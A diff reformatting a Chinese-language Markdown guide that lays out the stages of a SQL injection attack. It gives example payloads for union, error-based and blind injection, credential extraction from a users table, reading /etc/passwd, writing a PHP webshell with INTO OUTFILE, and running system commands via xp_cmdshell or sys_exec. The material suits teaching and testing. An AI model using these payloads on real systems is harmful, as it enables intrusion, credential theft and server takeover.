@@ -64,93 +64,93 @@ style AG fill:#f99,stroke:#c00
 
 ## 流程图说明
 
-1. **目标识别**：确定存在数据库交互的Web应用
+**目标识别**：确定存在数据库交互的Web应用
 
-2. **注入点探测**：
+**注入点探测**：
 
-   测试URL参数/表单输入
+> 测试URL参数/表单输入
+>
+> 添加`'`、`"`、`\`等特殊字符
 
-   添加`'`、`"`、`\`等特殊字符
+**错误判断**：
 
-3. **错误判断**：
+> 直接报错：快速确认注入类型
+>
+> 无报错：进入盲注检测流程
 
-   直接报错：快速确认注入类型
+**注入方式选择**：
 
-   无报错：进入盲注检测流程
+联合查询注入（有回显）
 
-4. **注入方式选择**：
+```sql
+UNION SELECT 1,@@version,3
+```
 
-   联合查询注入（有回显）
+报错注入（显示错误信息）
 
-   ```sql
-   UNION SELECT 1,@@version,3
-   ```
+```sql
+AND updatexml(1,concat(0x7e,version()),1)
+```
 
-   报错注入（显示错误信息）
+布尔盲注（页面内容差异）
 
-   ```sql
-   AND updatexml(1,concat(0x7e,version()),1)
-   ```
+```sql
+AND ascii(substr(database(),1,1))>100
+```
 
-   布尔盲注（页面内容差异）
+时间盲注（响应延迟）
 
-   ```sql
-   AND ascii(substr(database(),1,1))>100
-   ```
+```sql
+AND IF(1=1,SLEEP(5),0)
+```
 
-   时间盲注（响应延迟）
+**信息收集阶段**：
 
-   ```sql
-   AND IF(1=1,SLEEP(5),0)
-   ```
+> 获取数据库版本：`@@version`
+>
+> 列出数据库：`information_schema.schemata`
+>
+> 爆表名：`information_schema.tables`
+>
+> 爆列名：`information_schema.columns`
 
-5. **信息收集阶段**：
+**数据提取**：
 
-   获取数据库版本：`@@version`
+常规数据获取：
 
-   列出数据库：`information_schema.schemata`
+```sql
+UNION SELECT user,password FROM users
+```
 
-   爆表名：`information_schema.tables`
+大段数据获取：
 
-   爆列名：`information_schema.columns`
+```sql
+#用于从服务器文件系统中读取指定文件的内容，并以字符串形式返回
+LOAD_FILE('/etc/passwd')
+```
 
-6. **数据提取**：
+**权限提升**：
 
-   常规数据获取：
+数据库写文件：
 
-   ```sql
-   UNION SELECT user,password FROM users
-   ```
+```sql
+#可以将查询结果写入服务器上的文件中
+INTO OUTFILE '/var/www/shell.php'
+```
 
-   大段数据获取：
+执行系统命令：
 
-   ```sql
-   #用于从服务器文件系统中读取指定文件的内容，并以字符串形式返回
-   LOAD_FILE('/etc/passwd')
-   ```
+```sql
+#在 MySQL 中，默认情况下并不提供类似 MSSQL 的 xp_cmdshell 功能来直接执行系统命令。 可以通过安装用户自定义函数（UDF）来实现类似的功能。
+MSSQL: xp_cmdshell('whoami')
+#sys_exec() 是由第三方插件 lib_mysqludf_sys 提供的函数，允许在 MySQL 中执行系统命令
+MySQL: sys_exec()
+```
 
-7. **权限提升**：
+**横向移动**：
 
-   数据库写文件：
-
-   ```sql
-   #可以将查询结果写入服务器上的文件中
-   INTO OUTFILE '/var/www/shell.php'
-   ```
-
-   执行系统命令：
-
-   ```sql
-   #在 MySQL 中，默认情况下并不提供类似 MSSQL 的 xp_cmdshell 功能来直接执行系统命令。 可以通过安装用户自定义函数（UDF）来实现类似的功能。
-   MSSQL: xp_cmdshell('whoami')
-   #sys_exec() 是由第三方插件 lib_mysqludf_sys 提供的函数，允许在 MySQL 中执行系统命令
-   MySQL: sys_exec()
-   ```
-
-8. **横向移动**：
-
-   > 内网扫描
-   >
-   > 密码爆破
-   >
-   > 漏洞利用
+> 内网扫描
+>
+> 密码爆破
+>
+> 漏洞利用
